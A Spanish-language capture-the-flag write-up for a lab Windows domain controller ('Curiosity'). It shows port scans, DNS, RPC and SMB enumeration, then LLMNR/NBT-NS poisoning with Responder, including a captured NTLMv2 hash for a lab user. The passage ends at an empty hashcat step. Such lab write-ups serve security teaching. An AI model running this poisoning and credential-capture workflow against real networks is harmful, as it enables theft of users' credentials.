---
description: >-
  Writeup de la máquina de dificultad media Curiosity de la página https://thehackerslabs.com
title: THL - Curiosity | (Difficulty Medium) - Windows
date: 2025-02-11
categories: [Writeup, The Hackers Labs]
tags: [thl, hacking, the hacker labs, active directory, medium, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/314a021e-123d-4111-ae5c-49c9197ee0c1
---

## Useful Skills

* DNS Enumeration (dig)
* RCP Enumeration (rpcclient)
* SMB Enumeration (netexec)
* LLMNR Poisoning (responder)

## Enumeration

### TCP Scan

```bash
rustscan -a 192.168.1.138 --ulimit 5000 -g
192.168.1.138 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49680,49681,49687,49690,49703,49713]
```

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49680,49681,49687,49690,49703,49713 -sCV 192.168.1.138 -oN tcpScan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-11 15:11 CET
Nmap scan report for 192.168.1.138 (192.168.1.138)
Host is up (0.00014s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-11 14:11:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
|_ssl-date: 2025-02-11T14:12:10+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-11T14:12:10+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-11T14:12:10+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
|_ssl-date: 2025-02-11T14:12:10+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:7F:C9:C3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:7f:c9:c3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-02-11T14:12:01
|_  start_date: 2025-02-11T13:03:29
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.60 seconds
```

### UDP Scan

```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 192.168.1.138 -oN udpScan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-11 15:12 CET
Nmap scan report for 192.168.1.138
Host is up (0.00082s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
53/udp    open   domain
88/udp    open   kerberos-sec
123/udp   open   ntp
137/udp   open   netbios-ns
389/udp   open   ldap
31352/udp closed unknown
MAC Address: 08:00:27:7F:C9:C3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
```
> Hay que añadir el dominio hackme.thl y el FQDN DC.hackme.thl en el archivo de configuración /etc/hosts para que se pueda resolver el nombre de dominio a la dirección IP 192.168.1.138
{: .prompt-tip }

### DNS Enumeration

Intento obtener información adicional sobre el dominio a través de consultas DNS con dig, donde intento obtener los registros NS, MX, CNAME entre otros, posteriormente, trato de realizar una transferencia de zona, pero esta resulta fallida.

```bash
dig hackme.thl@192.168.1.138 axfr

; <<>> DiG 9.20.4-4-Debian <<>> hackme.thl@192.168.1.138 axfr
;; global options: +cmd
; Transfer failed.
```

### RPC Enumeration

Utilizo un null session para intentar enumerar información de todo los usuarios a través de RPC, pero el null session no se encuentra habilitado

```bash
rpcclient 192.168.1.138 -U "" -N -c enumdomusers
result was NT_STATUS_ACCESS_DENIED`bash
```

### SMB Enumeration

Utilizo NetExec para realizar un escaneo de SMB y obtener información clave como el sistema operativo, nombre del servidor, dominio, si la firma smb está habilita y si la versión antigua SMBv1 está activada o desactivada.

```bash
nxc smb 192.168.1.138
SMB  192.168.1.138  445  DC  [*] Windows  10 / Server 2016 Build 14393 x64  (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
```

Utilizo NetExec para enumerar los recursos compartidos del sistema a través del protocolo SMB con autenticación nula, pero no es posible

```bash
nxc smb 192.168.1.138 -u ' ' -p '' --shares
SMB  192.168.1.138  445  DC  [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
SMB  192.168.1.138  445  DC  [-] hackme.thl\ : STATUS_LOGON_FAILURE 
```
## Exploitation

### LLMNR Poisoning

Ejecuto la herramienta responder y la dejo en segundo plano, para así intentar capturar hashes NTLMv2 de usuarios autenticados en la red. Si algún usuario del dominio intenta acceder a un recurso de red (SMB, Servidor, Web, etc...) y por alguna razón el recurso no existe Windows intenta resolver el nombre usando LLMNR o NetBIOS, lo que desembocará en que Windows envíe las credenciales del usuario en forma de hash NTLMv2 a mi recurso falso.

```bash
python3 Responder.py -I eth0 -wd
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.1.1, now waiting for incoming requests...
[*] [NBT-NS] Poisoned answer sent to 192.168.1.138 for name SQLSERVER (service: File Server)
[*] [LLMNR]  Poisoned answer sent to fe80::74e2:7d8f:9f17:89fc for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::74e2:7d8f:9f17:89fc for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::9848:a4af:2563:6e54 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.1.138 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::9848:a4af:2563:6e54 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.1.138 for name SQLserver
[SMB] NTLMv2-SSP Client   : fe80::74e2:7d8f:9f17:89fc
[SMB] NTLMv2-SSP Username : hackme\jdoe
[SMB] NTLMv2-SSP Hash     : jdoe::hackme:faa58de1eb3d1697:AAB3D6BA09ABCC85ED1F843AF879EBE3:0101000000000000000855D3987CDB0167B939FA04E68AAD0000000002000800540032003500390001001E00570049004E002D0030003800300032004700460030004F005A005700520004003400570049004E002D0030003800300032004700460030004F005A00570052002E0054003200350039002E004C004F00430041004C000300140054003200350039002E004C004F00430041004C000500140054003200350039002E004C004F00430041004C0007000800000855D3987CDB01060004000200000008003000300000000000000000000000004000001AD337D04DF3A7641AB484A3BE312D3DF4FB5C6AB976C6A49E2347AC10EBE5740A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C00730065007200760065007200000000000000000000000000
```

Tras un rato de espera consigo obtener una hash NTLMv2, el cual consigo crackear de forma offline con hashcat

```bash

```
